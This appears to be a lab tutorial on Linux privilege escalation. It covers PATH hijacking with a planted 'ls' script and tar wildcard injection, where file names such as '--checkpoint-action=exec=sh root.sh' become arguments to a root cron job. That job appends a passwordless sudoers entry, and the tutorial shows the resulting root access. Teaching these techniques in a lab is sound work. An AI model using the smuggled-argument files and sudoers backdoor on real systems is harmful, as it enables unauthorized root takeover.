Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).

    htb_student@NIX02:~$ echo $PATH
    
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    

    htb_student@NIX02:~$ PATH=.:${PATH}
    htb_student@NIX02:~$ export PATH
    htb_student@NIX02:~$ echo $PATH
    
    .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    

In this example, we modify the path to run a simple `echo` command when the command `ls` is typed.

    htb_student@NIX02:~$ touch ls
    htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
    htb_student@NIX02:~$ chmod +x ls
    

    htb_student@NIX02:~$ ls
    
    PATH ABUSE!!
    


<h1>Wildcard Abuse</h1>
<hr>
<p>A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:</p>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Character</strong></th>
<th><strong>Significance</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*</code></td>
<td>An asterisk that can match any number of characters in a file name.</td>
</tr>
<tr>
<td><code>?</code></td>
<td>Matches a single character.</td>
</tr>
<tr>
<td><code>[ ]</code></td>
<td>Brackets enclose characters and can match any single one at the defined position.</td>
</tr>
<tr>
<td><code>~</code></td>
<td>A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.</td>
</tr>
<tr>
<td><code>-</code></td>
<td>A hyphen within brackets will denote a range of characters.</td>
</tr>
</tbody>
</table></div>
<p>An example of how wildcards can be abused for privilege escalation is the <code>tar</code> command, a common program for creating/extracting archives. If we look at the <a href="http://man7.org/linux/man-pages/man1/tar.1.html" target="_blank" rel="noopener nofollow">man page</a> for the <code>tar</code> command, we see the following:</p>
<div class="window_container"><div class="window_content">
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title"></span>
                </div>
            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token info punctuation"><span class="token user">htb_student@NIX02</span><span class="token punctuation">:</span><span class="token path">~</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">man</span> <span class="token function">tar</span></span></span>

<span class="token output">&lt;SNIP&gt;
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
</span></code></pre></div></div>
<p>The <code>--checkpoint-action</code> option permits an <code>EXEC</code> action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, <code>--checkpoint=1</code> and <code>--checkpoint-action=exec=sh root.sh</code> is passed to <code>tar</code> as command-line options. Let's see this in practice.</p>
<p>Consider the following cron job, which is set up to back up the <code>/root</code> directory's contents and create a compressed archive in <code>/tmp</code>. The cron job is set to run every minute, so it is a good candidate for privilege escalation.</p>
<div class="window_container"><div class="window_content">
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title"></span>
                </div>
            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">#
#
mh dom mon dow command
*/01 * * * * cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *
</span></code></pre></div></div>
<p>We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.</p>
<div class="window_container"><div class="window_content">
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title"></span>
                </div>
            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token info punctuation"><span class="token user">htb_student@NIX02</span><span class="token punctuation">:</span><span class="token path">~</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'echo "cliff.moore ALL=(root) NOPASSWD: ALL" &gt;&gt; /etc/sudoers'</span> <span class="token operator">&gt;</span> root.sh</span></span>
<span class="token info punctuation"><span class="token user">htb_student@NIX02</span><span class="token punctuation">:</span><span class="token path">~</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">&gt;</span> <span class="token string">"--checkpoint-action=exec=sh root.sh"</span></span></span>
<span class="token info punctuation"><span class="token user">htb_student@NIX02</span><span class="token punctuation">:</span><span class="token path">~</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">&gt;</span> --checkpoint<span class="token operator">=</span><span class="token number">1</span></span></span>
</code></pre></div></div>
<p>We can check and see that the necessary files were created.</p>
<div class="window_container"><div class="window_content">
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title"></span>
                </div>
            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token info punctuation"><span class="token user">htb_student@NIX02</span><span class="token punctuation">:</span><span class="token path">~</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">ls</span> -la</span></span>total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 cliff.moore cliff.moore   60 Aug 31 23:11 root.sh
</span></code></pre></div></div>
<p>Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.</p>
<div class="window_container"><div class="window_content">
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title"></span>
                </div>
            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token info punctuation"><span class="token user">htb_student@NIX02</span><span class="token punctuation">:</span><span class="token path">~</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sudo</span> -l</span></span>

<span class="token output">Matching Defaults entries for cliff.moore on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cliff.moore may run the following commands on NIX02:
    (root) NOPASSWD: ALL
</span></code></pre></div></div>
